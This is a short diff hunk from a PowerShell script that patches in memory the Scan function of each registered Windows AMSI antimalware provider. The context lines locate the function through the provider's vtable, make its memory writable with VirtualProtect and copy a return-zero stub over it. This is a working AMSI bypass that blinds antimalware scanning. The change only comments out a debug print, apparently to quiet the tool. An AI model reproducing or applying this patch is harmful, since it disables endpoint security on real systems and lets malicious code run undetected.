@@ -28,7 +28,7 @@ while ($AntimalwareProvider -ne 0)
   $AmsiProviderScanFunc = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$AntimalwareProviderVtbl, 24)
 
   # Patch the Scan function
-  Write-host "[$i] Provider's scan function found!" $AmsiProviderScanFunc
+  # Write-host "[$i] Provider's scan function found!" $AmsiProviderScanFunc
   [APIs]::VirtualProtect($AmsiProviderScanFunc, [uint32]6, 0x40, [ref]$p)
   [System.Runtime.InteropServices.Marshal]::Copy($ret_zero, 0, [IntPtr]$AmsiProviderScanFunc, 6)
   
